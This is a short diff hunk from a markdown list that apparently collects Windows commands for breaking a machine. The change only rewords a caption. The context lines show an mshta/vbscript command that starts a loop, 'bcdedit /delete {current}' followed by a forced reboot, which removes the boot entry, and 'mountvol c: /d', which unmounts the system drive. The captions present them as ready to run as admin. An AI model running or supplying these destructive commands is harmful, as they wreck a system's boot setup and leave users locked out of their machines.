@@ -27,7 +27,7 @@ cmd /c mshta vbscript:(CreateObject("WScript.Shell").Run("cmd /k for /l %x in (1
 cmd /k bcdedit /delete {current}&wmic os primary=1 reboot
 ```
 
-5. Unmount primary C:\ drive. If you execute this command **as admin**, users will be can't run any program anymore.
+5. Unmount primary C:\ drive. If you execute this command **as admin**, users cant interact with VM anymore.
 
 ```batch
 mountvol c: /d
